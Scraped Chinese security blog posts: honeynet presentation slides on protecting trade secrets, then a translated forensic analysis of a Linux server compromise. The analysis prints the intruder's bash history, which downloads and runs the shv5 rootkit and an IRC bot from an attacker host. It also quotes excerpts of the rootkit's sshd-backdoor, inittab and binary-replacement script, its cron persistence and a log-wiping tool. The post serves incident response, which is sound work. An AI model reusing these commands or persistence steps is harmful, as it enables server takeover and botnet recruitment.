吴鲁加 <a href="&#x6d;&#97;&#x69;&#x6c;&#x74;&#111;&#58;&#119;&#117;&#108;&#117;&#106;&#x69;&#97;&#x40;&#117;&#110;&#x6e;&#111;&#111;&#x2e;&#x63;&#x6f;&#x6d;">&#119;&#117;&#108;&#117;&#106;&#x69;&#97;&#x40;&#117;&#110;&#x6e;&#111;&#111;&#x2e;&#x63;&#x6f;&#x6d;</a>
<img src="" alt=""> <img src="" alt=""> 提纲
• • • • • 简单陷阱网络的构建与应用实例 企业 / 组织对秘密保护的要求 攻击路径假想 自防御型陷阱网络 总结与展望
第 2页
<img src="" alt=""> <img src="" alt=""> 用户需求与目标
• 需求
–服务器上保存有重要数据 –必须允许远程接入 –经常遇到大量扫描尝试
• 目标
–将进行扫描的 IP 地址屏蔽 –必要时研究该 IP 的址的目标
第 3页
<img src="" alt=""> <img src="" alt=""> 配置
• 工具
–portsentry –rinetd –VMWare
• 思路
–默认启动 portsentry 对扫描行为进行监视
• KILL_RUN_CMD=”/usr/sbin/rinetd&quot;
–发现攻击企图后，启动 rinetd 转向 ViruteHoneynet
• 0.0.0.0 1433 192.168.0.55 1433 • logfile /var/log/rinetd.log
第 4页
<img src="" alt=""> <img src="" alt=""> 效果
• 攻击
–攻击者对 MSSQL 服务器进行攻击 –sa 密码为 123456
• 记录
–Portsentry 、 rinetd 日志 –MSSQL 操作日志 –截图
第 5页
<img src="" alt=""> <img src="" alt=""> 典型高科技企业的知识产权结构
• 金字塔结构
–专利权 –著作权 –商业秘密
第 6页
<img src="" alt=""> <img src="" alt=""> <img src="" alt=""> 企业技术秘密的窥视者
第 7页
<img src="" alt=""> <img src="" alt=""> 技术秘密的保护标准
• 法律的要求：“权利人采取保密措施”
–保护标准：除非经权利人许可，否则他人不能以合法渠 道获得 –保护基线：只需采取基本的、适度的保密措施即可，如 保密协议、保密管理规定
• 管理的要求：他人不能从权利人获得
–保护标准：除非经权利人许可，否则他人不能获得 –保护基线：需要采取大量系统化的保护措施
第 8页
<img src="" alt=""> <img src="" alt=""> 企业对技术秘密的保护要求
• 要求
–不该获得的人不能获得 –获得的人拿不出去 –拿出去的必然合法及合乎企业规范 –非法拿出去必须有痕迹
• 防护措施
–技术 ( 我们的重心 ) ，陷阱网络能做到
• 避免信息被“非法”获取 • 减少信息被“骚扰”的机率 • 保证“非法”获取有记录
–管理
第 9页
<img src="" alt=""> <img src="" alt=""> <img src="" alt=""> 外部黑客的攻击手段
第 10页
<img src="" alt=""> <img src="" alt=""> <img src="" alt=""> 内部员工攻击手段
第 11页
<img src="" alt=""> <img src="" alt=""> 自防御型陷阱网络思路
• 从前面简单的 Honeypot 设置进一步设想 • 从各种 AntiDDoS 设备的宣传
–下水道路由
第 12页
<img src="" alt=""> <img src="" alt=""> <img src="" alt=""> ADDN 网络抵御 DDoS 攻击
来源 :ADDN 网络抵御 DDoS 攻击 ( 刘闻欢 ) 第 13页
<img src="" alt=""> <img src="" alt=""> <img src="" alt=""> 自防御型陷阱的基本设计
第 14页
<img src="" alt=""> <img src="" alt=""> 三个技术核心部份
• Unnoo 陷阱网关 • Honeyd 服务器构成的虚拟网络 • 虚拟机构成的 Honeypot 组
第 15页
<img src="" alt=""> <img src="" alt=""> 自防御型 NAT 陷阱网关的构成
• 策略控制
–Snort 、 SnortSam
• NAT
–iptables
• 数据分析
–Sebek
第 16页
<img src="" alt=""> <img src="" alt=""> 基于时间的控制
• 主要应用范围
–保密单位 –访问策略可以按时间定义的网络
• 技术实现
–crontab 添加及删除规则
• 应用特点
–内容级 Honeypot –主要对象是内部“违规者”
第 17页
<img src="" alt=""> <img src="" alt=""> 虚拟机
• VMWare • UML(UserModLinux)
第 18页
<img src="" alt=""> <img src="" alt=""> 基于协议和开放端口的控制
• 主要应用范围
–网络协议固定的单位（银行、证券、运营商等） –前提是需要做好应用及端口管理
• 技术实现
–iptables 直接将访问目标无效协议端口的数据 NAT 转发
• 应用特点
–网络级 Honeypot ，可以与 Honeyd 结合应用 –主要对象是已经进入内部网络的“渗透者”
第 19页
<img src="" alt=""> <img src="" alt=""> <img src="" alt=""> Honeyd(1)
第 20页
<img src="" alt=""> <img src="" alt=""> <img src="" alt=""> honeyd(2)
第 21页
<img src="" alt=""> <img src="" alt=""> 基于 IP 地址的控制
• 主要应用范围
–特定高安全级别的设备及网络，如网管
• 技术实现
–直接采用 iptables 设置 NAT 规则
• 应用特点
–应用对象是所有有意无意的“试探者”
第 22页
<img src="" alt=""> <img src="" alt=""> 基于扫描和攻击的访问控制
• 主要应用范围
–保密单位、实验机构等 –技术研究组织更倾向于研究这类型的攻击
• 技术实现
–发现工具
• 扫描： portsentry • 攻击： Snort
–联动工具
• SnortSam
• 应用特点
–应用对象是所有目的明确的“攻击者”
第 23页
<img src="" alt=""> <img src="" alt=""> <img src="" alt=""> SnortSam 和 iptables
• SnortSam
–ssp_iptables.c –基于攻击报文的 NAT –能够结合 Checkpoint 等
• iptables
–灵活高效，有大量的配置工具
第 24页
<img src="" alt=""> <img src="" alt=""> <img src="" alt=""> <img src="" alt=""> iptables 配置与连接效果
第 25页
<img src="" alt=""> <img src="" alt=""> <img src="" alt=""> SnortSam 可以调整的部份
第 26页
<img src="" alt=""> <img src="" alt=""> <img src="" alt=""> 对攻击报文的分析
• Sebek
第 27页
<img src="" alt=""> <img src="" alt=""> 总结
• 企业秘密保护的要求 • 陷阱网络对企业秘密保护的意义
–实现“内容级”的 Honeypot –隐藏真实目标 –及时发现和处理小规模恶意事件 –攻击者分类及分别对待（试探、违规、攻击、渗透）
• 自防御型陷阱网络的构成
第 28页
<img src="" alt=""> <img src="" alt=""> 展望
• 对自防御型 NAT 陷阱的完善
–融合、统一控制及数据分析 –roo CDROM [Honeynet project]
• 其它类型陷阱网络
–客户端陷阱（针对内网用户的客户端攻击） –帐号口令陷阱（针对网络钓鱼）
第 29页
<img src="" alt=""> <img src="" alt=""> <img src="" alt=""> <img src="" alt=""> <img src="" alt=""> 关于大成天下 (<a href="http://www.unnoo.com" target="_blank">http://www.unnoo.com</a>)
我们的技术专长
渗透测试（ Penetration testing ） 网络架构评估设计（ Architecture review and design ） 应用审计（ Application audit ） 源代码审计（ Source code review ） 黑箱测试（ Online or Binary Black box testing ） 审计、追踪与数据恢复（ Forensics ） 协议分析（ Protocol analysis ）
我们的产品
游刃基线安全系统 铁卷信息监控平台
我们的服务
网络安全评估 网络安全培训 信息安全监理 软件定制开发
第 30页
<img src="" alt=""> <img src="" alt=""> <img src="" alt=""> 谢谢！</p>

      
    </div>
    
    
      
    
    
        <footer id="post-meta">
        <span class="categories">Posted in<span class="breadcrumb fa fa-folder"><li><a href="/categories/安全/">安全</a></li></span></span> | <span class="tags">Tagged <a href="/tags/安全/" class="label label-primary">安全</a></span> | <span class="time">recent updated:<time title="2014-03-07 09:54:38"datetime="2014-03-07 09:54:38"> mar. 7 2014</time></span> | <span class="comment-link">
<a href="http://itsolife.com/2014/02/02/2014-02-02-安全--企业秘密保护与陷阱网络10/#comments" class="ds-thread-count comment-link" data-thread-key="2014-02-02-安全--企业秘密保护与陷阱网络10" data-count-type="comments">暂无评论</a></span>
        </footer>
    
    <div class="clearfix"></div>
  </div>
</div>
</article>



  <article>
<div id="post" class="post well">
  <div class="post-content">
    <header class="well-sm">
      <i class="fa icon fa-5x pull-left"></i>
      <h1 class="title"><a href="/2014/02/02/2014-02-02-安全--一次服务器被入侵后的分析/">一次服务器被入侵后的分析</a></h1>
      
        <span>Posted on<time datetime="2014-02-02T01:54:38.000Z"> <a href="/2014/02/02/2014-02-02-安全--一次服务器被入侵后的分析/">feb. 2 2014</a></time></span>      
    </header>
    
    
    <div class="entry">
      
        <h1 id="-">一次服务器被入侵后的分析</h1>
<h3 id="-">分享到</h3>
<ul>
<li><a href="">一键分享</a></li>
<li><a href="">QQ空间</a></li>
<li><a href="">新浪微博</a></li>
<li><a href="">百度云收藏</a></li>
<li><a href="">人人网</a></li>
<li><a href="">腾讯微博</a></li>
<li><a href="">百度相册</a></li>
<li><a href="">开心网</a></li>
<li><a href="">腾讯朋友</a></li>
<li><a href="">百度贴吧</a></li>
<li><a href="">豆瓣网</a></li>
<li><a href="">搜狐微博</a></li>
<li><a href="">百度新首页</a></li>
<li><a href="">QQ好友</a></li>
<li><a href="">和讯微博</a></li>
<li><a href="">更多...</a></li>
</ul>
<p><a href="">百度分享</a></p>
<ul>
<li><a href="http://www.freebuf.com/" target="_blank">首页</a></li>
<li><a href="http://www.freebuf.com/category/news" target="_blank">资讯</a></li>
<li><a href="http://www.freebuf.com/category/tools" target="_blank">工具</a></li>
<li><p><a href="http://www.freebuf.com/category/articles" target="_blank">文章</a></p>
</li>
<li><p><a href="http://www.freebuf.com/category/articles/web" target="_blank">WEB安全</a></p>
</li>
<li><a href="http://www.freebuf.com/category/articles/wireless" target="_blank">无线安全</a></li>
<li><a href="http://www.freebuf.com/category/articles/system" target="_blank">系统安全</a></li>
<li><a href="http://www.freebuf.com/category/articles/database" target="_blank">数据库安全</a></li>
<li><a href="http://www.freebuf.com/category/articles/terminal" target="_blank">终端安全</a></li>
<li><a href="http://www.freebuf.com/category/articles/others-articles" target="_blank">其他</a></li>
<li><a href="http://www.freebuf.com/category/video" target="_blank">视频</a></li>
<li><a href="http://www.freebuf.com/category/jobs" target="_blank">招聘</a></li>
<li><a href="http://www.freebuf.com/category/geek" target="_blank">极客</a></li>
<li><a href="http://www.freebuf.com/bufer" target="_blank">达人</a></li>
<li><a href="http://www.freebuf.com/newsend" target="_blank">投稿</a></li>
</ul>
<p><a href="http://www.freebuf.com/wp-login.php?redirect_to=http://www.freebuf.com" title="登陆" target="_blank">登陆</a><a href="http://www.freebuf.com/wp-login.php?action=register" target="_blank">注册</a></p>
<p><a href="http://www.freebuf.com/" target="_blank"><img src="" alt="freebuf"></a></p>
<p><a href="http://www.weibo.com/freebuf" title="收听新浪微博" target="_blank">新浪微博</a> <a href="http://t.qq.com/freebuf" title="收听腾讯微博" target="_blank">腾讯微博</a><a href="http://www.freebuf.com/feed" title="订阅我们" target="_blank">订阅我们</a></p>
<h3 id="-">一次服务器被入侵后的分析</h3>
<p><a href=""></a><a href="http://www.freebuf.com/author/litdg" title="由 litdg 发布">litdg</a> @ <a href="http://www.freebuf.com/category/articles/system" title="查看 系统安全 中的全部文章" target="_blank">系统安全</a> 2013-09-11 共 <strong>9902</strong> 人围观 </p>
<p><strong>最近有个朋友让我去帮他看一下他的linux服务器.说是apache启动不了,有很多诡异的情况.后来证明绝不是apache启动不了这么简单.</strong></p>
<p>登上服务器之后随便看了下,最先引起我注意的是”ls”命令的输出:</p>
<p>lars@server1:~$ ls ls: invalid option -- h Try `ls --help&#39; for more information.</p>
<p>为什么”ls”默认加了”-h”参数呢?我用”alias”命令看了一下,然后取消了这个别名之后”ls”就工作正常了.</p>
<p>lars@server1:~$ alias ls alias ls=&#39;ls -sh --color=auto&#39; lars@server1:~$ unalias ls lars@server1:~$ ls backup lars@server1:~$</p>
<p>虽然很奇怪,不过我的首要任务是先把apache启动起来,等过会再仔细研究这个问题.</p>
<p>lars@server1:~$ sudo /etc/init.d/apache2 start Password: /* Starting apache 2.0 web server... (2): apache2: could not open error log file /var/log/apache2/error.log. Unable to open logs ...fail!</p>
<p>纳尼?赶紧去”/var/log/”目录一看,果然”apache2/”文件夹不见了.而且这个目录下其他的文件夹,比如”mysql/”,”samba/”也都不见了.一定是哪里出错了.会不会是我朋友不小心删掉了呢,他跟我说绝对没有.然后我用root登录进去准备修复日志丢失的问题.</p>
<p>lars@server1:~$ sudo -i Password: root@server1:~/# ls ls: unrecognized prefix: do ls: unparsable value for LS_COLORS environment variable total 44 4 . 4 .bashrc 4 .ssh 4 .. 4 .lesshst 8 .viminfo 8 .bash_history 4 .profile 4 .vimrc</p>
<p>很不幸的发现,”ls”又出问题了.同样,用”alias”命令:</p>
<p>root@server1:~/# alias ls alias ls=&#39;ls -sa --color=auto&#39; root@server1:~/# unalias ls root@server1:~/# ls root@server1:~/#</p>
<p>这个时候,我才意识到问题的严重性.”ls”奇怪的举动和”/var/log/”大量日志被删除让我怀疑服务器是否被入侵了.当我看到root目录下的”.bash_history”时,就已经可以确定被入侵了.</p>
<p>root@server1:~/# cat -n .bash_history ... 340 w 341 cd /var 342 wget <a href="http://83.19.148.250/~matys/pliki/shv5.tar.gz" target="_blank">http://83.19.148.250/~matys/pliki/shv5.tar.gz</a> 343 tar -zxf shv5.tar.gz 344 rm -rf shv5.tar.gz 345 mv shv5 .x 346 cd .x 347 ./setup zibi.joe.149 54098 348 passwd 349 passwd 350 ps aux 351 crontab -l 352 cat /etc/issue 353 cat /etc/passwd 354 w 355 who 356 cd /usr/lib/libsh 357 ls 358 hide + 359 chmod +x hide 360 hide + 361 ./hide + 362 cd /var/.x 363 mkdir psotnic 364 cd psotnic 365 wget <a href="http://83.19.148.250/~matys/pliki/psotnic0.2.5.tar.gz" target="_blank">http://83.19.148.250/~matys/pliki/psotnic0.2.5.tar.gz</a> 366 tar -zxf psotnic0.2.5.tar.gz 367 rm -rf psotnic0.2.5.tar.gz 368 ls 369 mv psotnic-0.2.5-linux-static-ipv6 synscan 370 ./synscan 371 vi conf 372 vi conf1 373 mv synscan smbd 374 smbd -c conf 375 ls 376 ps aux 377 ls 378 ./smbd -c conf 379 ./smbd -c conf1 380 ./smbd conf 381 ./smbd conf1 382 ./smbd -a conf conf1 383 rm -rf conf.dec 384 rm -rf conf1.dec 385 cd /usr/lib/libsh 386 ./hide + 387 exit ... 425 ssh ftp@62.101.251.166 426 w 427 ls 428 ls 429 cd /var/.x 430 ls 431 cd psotnic/ 432 ls 433 rm -rf /var/log//* 434 exit 435 ls 436 cd /var/.x/psotnic/ 437 ls 438 vi conf2 439 ./smbd -c conf2 440 ./smbd conf2 441 ./smbd -a conf conf1 conf2 442 rm -rf conf2.dec 443 cd .. 444 ls 445 cd /usr/lib/libsh 446 hide + 447 ./hide + 448 exit 449 ps aux 450 cd /var/.x 451 ls 452 ls 453 cd psotnic/ 454 ls 455 cat pid.MastaH 456 kill -9 2030 457 ./synscan -a conf conf1 458 ./smbd -a conf conf1 459 cd /usr/lib/libsh 460 ./hide +</p>
<p>Woht!这个系统已经被入侵了.这实在是令人激动的一件事情,不过很显然,我的朋友不这么想.这个入侵者犯了一个很基本的错误,没有清除”.bash_history”文件.所以他/她可能在其他的地方也留下了一些蛛丝马迹.接下来就是详细的分析一下这次入侵.</p>
<p>通过bash history我们得到了大量的信息.先来看一下”/var/.x”下面隐藏了什么和命令”setup zibi.joe.149 54098″的作用吧.</p>
<p>root@server1:/var/.x/# file setup setup: Bourne-Again shell script text executable root@server1:/var/.x/# wc -l setup 825 setup root@server1:/var/.x/# head -17 setup /#!/bin/bash /# /# shv5-internal-release /# by: PinT[x] April/2003 /# /# greetz to: /# /# [/<em>] SH-members: BeSo_M, grass^, toolman, nobody, niceboy, armando99 /# C00L|0, GolDenLord, Spike, zion ... /# [/</em>] Alba-Hack : 2Cool, heka, TheMind, ex-THG members ... /# [/<em>] SH-friends: mave, AlexTG, Cat|x, klex, JinkS ... /# [/</em>] tC-members: eksol, termid, hex, keyhook, maher, tripod etc.. /# [/<em>] And all others who diserve to be here but i forgot /# [/</em>] them at the moment ! /# /# PRIVATE ! DO NOT DISTRIBUTE /<em>censored/</em>EZ !</p>
<p>“setup”这个脚本是rootkit shv5的安装脚本.它安装了一个修改过的ssh后门–”/bin/ttyload”,然后把它加到了”/etc/inittab”,这样每次重启后就会自动启动.(相关部分的脚本如下:)</p>
<p>mv $SSHDIR/sshd /sbin/ttyload chmod a+xr /sbin/ttyload chmod o-w /sbin/ttyload touch -acmr /bin/ls /sbin/ttyload chattr +isa /sbin/ttyload kill -9 <code>pidof ttyload</code> &gt;/dev/null 2&gt;&amp;1 .... /# INITTAB SHUFFLING chattr -isa /etc/inittab cat /etc/inittab |grep -v ttyload|grep -v getty &gt; /tmp/.init1 cat /etc/inittab |grep getty &gt; /tmp/.init2 echo &quot;/# Loading standard ttys&quot; &gt;&gt; /tmp/.init1 echo &quot;0:2345:once:/usr/sbin/ttyload&quot; &gt;&gt; /tmp/.init1</p>
<p>它也替换了一些linux的标准命令.</p>
<p>/# Backdoor ps/top/du/ls/netstat/etc.. cd $BASEDIR/bin BACKUP=/usr/lib/libsh/.backup mkdir $BACKUP ... /# ls ... chattr -isa /bin/ls cp /bin/ls $BACKUP mv -f ls /bin/ls chattr +isa /bin/ls</p>
<p>这样子就可以解释为什么”ls”命令输出那么奇怪了.</p>
<p>“.backup”文件夹保存了被替换之前的命令程序.</p>
<p>root@server1:/var/.x/# ls -l /usr/lib/libsh/.backup/ total 552 -rwxr-xr-x 1 root root 126276 Dec 24 22:58 find -rwxr-xr-x 1 root root 59012 Dec 24 22:58 ifconfig -rwxr-xr-x 1 root root 77832 Dec 24 22:58 ls -rwxr-xr-x 1 root root 30388 Dec 24 22:58 md5sum -rwxr-xr-x 1 root root 99456 Dec 24 22:58 netstat -rwxr-xr-x 1 root root 65492 Dec 24 22:58 ps -rwxr-xr-x 1 root root 14016 Dec 24 22:58 pstree -rwxr-xr-x 1 root root 50180 Dec 24 22:58 top</p>
<p>看了一下时间戳,居然是在圣诞节.</p>
<p>很显然,原始的”ls”和后门安装的”ls”是不一样的.他们的md5对比如下:
root@server1:~/# md5sum /usr/lib/libsh/.backup/ls /bin/ls eef7ca9dd6be1cc53bac84012f8d1675 /usr/lib/libsh/.backup/ls 0a07cf554c1a74ad974416f60916b78d /bin/ls root@server1:~/# file /bin/ls /bin/ls: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), for GNU/Linux 2.0.0, dynamically linked (uses shared libs), for GNU/Linux 2.0.0, stripped root@server1:~/# file /usr/lib/libsh/.backup/ls /usr/lib/libsh/.backup/ls: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), for GNU/Linux 2.6.0, dynamically linked (uses shared libs), for GNU/Linux 2.6.0, stripped</p>
<p>这个rootkit(“sh5.tar.gz”)是从下面的地址下载的.</p>
<p>root@server1:~/# dig +short -x 83.19.148.250 4lo.bydg.pl.</p>
<p>这是一个波兰的ip,从这个ip上没有得到更多的信息.不过这个入侵者依然犯了几个严重的错误.</p>
<p>这是运行”setup”命令的截图:(在服务器上的沙盒里运行的)</p>
<p><img src="http://static.freebuf.com/uploads/image/20130910/20130910030843_30626.jpg" alt=""></p>
<p>所以”zibi.joe.149″是后门的密码,”54098″是端口号.这是一个来自ssh.com的就版本的sshd.测试截图如下:</p>
<p><img src="http://static.freebuf.com/uploads/image/20130910/20130910030856_44197.jpg" alt=""></p>
<p>安装完后门之后,下一个步骤就是装一个irc-bot,让服务器变成僵尸网络中的一员.”psotnic0.2.5.tar.gz”就是来达到这个目的的.入侵者解压这个包之后把 irc-bot重命名为”smbd”,来达到隐藏的目的.</p>
<p>然后,他创建了两个配置文件.文件中包含irc服务器和需要加入的频道.配置文件是加密过的,而且明文的配置文件被删掉了.</p>
<p>371 vi conf 372 vi conf1 .... 378 ./smbd -c conf 379 ./smbd -c conf1 380 ./smbd conf 381 ./smbd conf1 382 ./smbd -a conf conf1</p>
<p>让我们执行一下382这条命令,看看会发生什么.
root@server1:/var/.x/psotnic/# ./smbd -a conf conf1 Psotnic C++ edition, version 0.2.5-ipv6 (Jul 17 2005 20:39:49) Copyright (C) 2003-2005 Grzegorz Rusin [+] Adding: /<em>/10 /</em> /<em> /</em> /<em> cd /var/.x/psotnic; ./smbd conf &gt;/dev/null 2&gt;&amp;1 [+] Adding: /</em>/10 /<em> /</em> /<em> /</em> cd /var/.x/psotnic; ./smbd conf1 &gt;/dev/null 2&gt;&amp;1 [+] Added 2 psotnics to cron</p>
<p>哇!它添加了cron定时任务.赶紧看一看:</p>
<p>root@server1:/var/.x/psotnic/# crontab -l /<em>/10 /</em> /<em> /</em> /<em> cd /var/.x/psotnic; ./smbd conf &gt;/dev/null 2&gt;&amp;1 /</em>/10 /<em> /</em> /<em> /</em> cd /var/.x/psotnic; ./smbd conf1 &gt;/dev/null 2&gt;&amp;1</p>
<p>接下来,我杀掉这两个恶意的smbd进程,禁用cron任务.在另一个shell中运行了tcpdump,然后手动启动了这两个irc-bot进程:
root@server1:~/# cd /var/.x/psotnic; ./smbd conf Psotnic C++ edition, version 0.2.5-ipv6 (Jul 17 2005 20:39:49) Copyright (C) 2003-2005 Grzegorz Rusin [/<em>] Acting as LEAF [+] Config loaded [+] Going into background [pid: 5724] root@server1:/var/.x/psotnic/# ./smbd conf1 Psotnic C++ edition, version 0.2.5-ipv6 (Jul 17 2005 20:39:49) Copyright (C) 2003-2005 Grzegorz Rusin [/</em>] Acting as LEAF [+] Config loaded [+] Going into background [pid: 5727] root@server1:/var/.x/psotnic/#</p>
<p>用”ps”命令(后门替换过的)可以看到这两个进程.这也是为什么入侵者需要通过改名字来隐藏进程.</p>
<p>root@server1:/var/.x/psotnic/# ps axuw | grep smb root 3799 0.0 0.4 8592 2156 ? S 11:00 0:00 /usr/sbin/smbd -D root 3808 0.0 0.1 8592 896 ? S 11:00 0:00 /usr/sbin/smbd -D root 5724 0.0 0.1 1648 772 pts/2 S 12:47 0:00 ./smbd conf root 5727 0.0 0.1 1640 764 pts/2 S 12:47 0:00 ./smbd conf1</p>
<p>最开始两个是真正的samba进程,后面两个是irc-bot,让我们用”strace”命令来看看它做了什么:
root@server1:~/# strace -p 5727 ... connect(3, {sa_family=AF_INET, sin_port=htons(9714), sin_addr=inet_addr(&quot;83.18.74.235&quot;)}, 16) = -1 EINPROGRESS (Operation now in progress) ... connect(4, {sa_family=AF_INET, sin_port=htons(6667), sin_addr=inet_addr(&quot;195.159.0.92&quot;)}, 16) = -1 EINPROGRESS (Operation now in progress)</p>
<p>可以看到它尝试连接ip 83.18.74.235的9714端口和195.159.0.92的6667端口:</p>
<p>root@server1:~/# dig +short -x 83.18.74.235 manhattan.na.pl. root@server1:~/# dig +short -x 195.159.0.92 ircnet.irc.powertech.no.</p>
<p>又是一个波兰的ip.另外一个ip,”ircnet.irc.powertech.no”是”irc.powertech.nof”的别名.是挪威一个著名的irc服务器.</p>
<p>tcpdump抓到了连接irc服务器的流量.正如下面的内容显示,它连接到了”irc.powertech.no”,加入了”/#aik”频道.
:irc.powertech.no 001 578PAB9NB :Welcome to the Internet Relay Network 578PAB9NB!~op@ti231210a080-3666.bb.online.no :irc.powertech.no 002 578PAB9NB :Your host is irc.powertech.no, running version 2.11.1p1 :578PAB9NB!~op@ti231210a080-3666.bb.online.no JOIN :/#aik :irc.powertech.no 353 578PAB9NB @ /#aik :578PAB9NB kknd raider brandyz jpi conf xerkoz IpaL vvo :irc.powertech.no 366 578PAB9NB /#aik :End of NAMES list. :irc.powertech.no 352 578PAB9NB /#aik ~op ti231210a080-3666.bb.online.no irc.powertech.no 578PAB9NB G :0 op - GTW :irc.powertech.no 352 578PAB9NB /#aik ~kknd ti231210a080-3666.bb.online.no irc.hitos.no kknd H :2 kknd - GTW :irc.powertech.no 352 578PAB9NB /#aik ~raider mobitech-70.max-bc.spb.ru /<em>.dotsrc.org raider G :4 raider - GTW :irc.powertech.no 352 578PAB9NB /#aik ~brandyz mobitech-70.max-bc.spb.ru /</em>.dotsrc.org brandyz G :4 brandyz - GTW :irc.powertech.no 352 578PAB9NB /#aik ~jpi p3124-ipad309sasajima.aichi.ocn.ne.jp /<em>.jp jpi G :8 jpi - GTW :irc.powertech.no 352 578PAB9NB /#aik ~conf p3124-ipad309sasajima.aichi.ocn.ne.jp /</em>.jp conf G :7 conf - GTW :irc.powertech.no 352 578PAB9NB /#aik ~xerkoz p3124-ipad309sasajima.aichi.ocn.ne.jp /<em>.jp xerkoz H :7 xerkoz - GTW :irc.powertech.no 352 578PAB9NB /#aik lm campus19.panorama.sth.ac.at /</em>.at IpaL H :5 .LaPi.9@.IRCNet.. :irc.powertech.no 352 578PAB9NB /#aik ~vvo ppp86-7.intelcom.sm /*.tiscali.it vvo H :6 vvo - GTW :irc.powertech.no 315 578PAB9NB /#aik :End of WHO list. 这些仅仅是加入/#aik频道,并开始监听该频道所有成员的一些原始网络流量.我决定自己进入这个频道看看.令我惊讶的是不需要任何密码我就进来了. 17:43 -!- viper42 [~viper42@trinity.gnist.org] has joined /#aik 17:43 [Users /#aik] 17:43 [ 578PAB9NL] [ conf] [ jpi ] [ raider ] [ vvo ] 17:43 [ brandyz ] [ IpaL] [ kknd] [ viper42] [ xerkoz] 17:43 -!- Irssi: /#aik: Total of 10 nicks [0 ops, 0 halfops, 0 voices, 10 normal] 17:43 -!- Irssi: Join to /#aik was synced in 1 secs</p>
<p>我发现我朋友的服务器使用的昵称是”578PQB9NB”,还有一些其他的服务器也在这里.这些僵尸服务器应该是正在等待着我们的入侵者加入频道发布命令.或者他已经潜藏在这里了.我注意到,所有的昵称都有一个后缀”\/*-GTW”,只有一个没有:</p>
<p>17:45 [powertech] -!- IpaL [lm@campus19.panorama.sth.ac.at] 17:45 [powertech] -!- ircname : LaPi@IRCNet 17:45 [powertech] -!- channels : /#relaks /#ping @/#seks /#aik @/#ogame.pl /#pingwinaria /#hattrick /#trade /#admin @/#!sh 17:45 [powertech] -!- server : /*.at [\o\ \o/ /o/]</p>
<p>这是唯一一个加入了多个频道的昵称.我猜我已经找到这个入侵者了,除非这是一个故意迷惑的诱饵.(恩,这个入侵者真的真么笨!!这么容易就找到了!?).我决定等几天看看有木有什么有趣的事情发生.这个域名解析到了:</p>
<p>$ dig +short campus19.panorama.sth.ac.at 193.170.51.84</p>
<p>根据RIPE的数据,这个ip属于Vienna University计算机中心,我发了一封邮件询问关于这个域名的信息,他们几个小时后会我了:
From: Alexander Talos via RT To: larstra@ifi.uio.no Subject: Cracker at campus19.panorama.sth.ac.at (193.170.51.84) [ACOnet CERT /#38603] Date: Fri, 18 May 2007 18:22:43 +0200 (CEST) Reply-To: cert@aco.net -----BEGIN PGP SIGNED MESSAGE----- Hash: SHA1 Hej! On Fri May 18 14:45:03 2007, larstra@ifi.uio.no wrote: &gt; I have been tracking down cracker which connected from &gt; campus19.panorama.sth.ac.at (193.170.51.84). The user, which Ouch. panorama.sth.ac.at is a dormitory with about 4k rooms all behind a NAT gateway - it will be very hard to get hold of the miscreant. This incident will, in the long run, definitely help me getting rid of the NAT boxes in setups like that, but right now, we will have to make do with what we have. &gt; Please investigate the host in question. Perhaps is this a &gt; compromised host on your network acting as a jumpstation for Sure, and even in a NATed environment, this is still possible. Btw, you did a great job in analysing the compromised machine! I&#39;ll let you know when I have either further questions or any interesting results. Cheers, Alexander Talos - -- IT-Security, Universitaet Wien, ACOnet CERT T: +43-1-4277-14351 M: +43-664-60277-14351</p>
<p>看起来我不够幸运.</p>
<p>接下来我曾尝试连接irc频道里其他僵尸主机的 54098端口,可惜都失败了.看来其他的僵尸主机的后门可能使用的是别的端口.</p>
<p>连接到”83.18.74.235″的流量看起来很混乱.只好再次用strace命令:</p>
<p>root@server1:/var/.x/psotnic/# strace -f ./smbd conf1 &amp;&gt; /root/dump.strace</p>
<p>跟预期的一样,有很多输出,其中一个是它尝试启动”BitchX”,这是一个irc客户端.但是失败了,因为BitchX没有安装:</p>
<p>[pid 7537] write(2, &quot;sh: &quot;, 4) = 4 [pid 7537] write(2, &quot;BitchX: not found&quot;, 17) = 17 [pid 7537] write(2, &quot;n&quot;, 1) = 1 [pid 7537] close(2) = 0</p>
<p>下面的截图是tcpdump抓到流量的一部分:</p>
<p><img src="http://static.freebuf.com/uploads/image/20130911/20130911000637_34187.jpg" alt=""></p>
<p>这仅仅是两个假的smbd进程中的一个.另外一个也连到了两个irc服务器,一个是波兰这个,另外一个是”irc.hitos.no”,位于挪威的特罗姆斯郡.</p>
<p>入侵者除了这些,还运行了一个叫”hide”的脚本来清除日志:
root@server1:/usr/lib/libsh/# ./hide + Linux Hider v2.0 by mave enhanced by me! [+] [Shkupi Logcleaner] Removing + from the logs........ . [+] /var/log/messages ... [done] [+] /var/run/utmp ... [done] [+] /var/log/lastlog ... [done] [+] /var/log/wtmp ... [done] /<em> m i s s i o n a c c o m p l i s h e d /</em> p.h.e.e.r S.H.c.r.e.w</p>
<p>那么这个入侵者为什么还要把”/var/log/”目录全删除了呢,是不相信这个工具么?还是他特别害怕?</p>
<p>可以看到这个服务器被入侵了,安装了后门而且加入了僵尸网咯.但是入侵者犯了几个错误导致他可能被侦查到:</p>
<p>1, 忘记清除”.bash_history”文件</p>
<p>2, “/var/log”目录下所有文件都删除了.导致某些程序无法启动.很容易被发现.</p>
<p>3, 修改了root的密码.又是一个愚蠢的行为.永远不要修改root密码,这个必然会引起管理员的注意.</p>
<p>4, irc的频道没有密码保护.虽然即使有密码,我们也可以抓包分析出来.</p>
<p>5, 入侵者平时就在僵尸网络的频道闲逛?如果是这样的话那他已经暴露了.</p>
<p>当然还有几个遗留的问题:</p>
<p>1,”ssh ftp@62.101.251.166″ 这个命令是干嘛的.是入侵者不小心敲错了么还是有其他的目的?</p>
<p>$ dig +short -x 62.101.251.166 cA6FB653E.dhcp.bluecom.no.</p>
<p>2,跟83.18.74.235(manhattan.na.pl)的通讯内容是什么?</p>
<p>3,最重要的问题是他一开始是如何或得下系统的权限的?这个服务器运行的是Ubuntu 6.06 LTS,打了最新的补丁.可能入侵的途径:</p>
<p>/<em>猜测root密码,不幸的是这个密码是强密码/</em></p>
<p>/<em>未知的exploit/</em></p>
<p>/<em>某个用户在已经被攻陷的主机上登录这台服务器.入侵者嗅探到了密码./</em></p>
<p><a href="http://blog.larsstrand.no/2007/04/holiday-cracking.html" target="_blank">原文地址</a>
9 1 您已评价！</p>
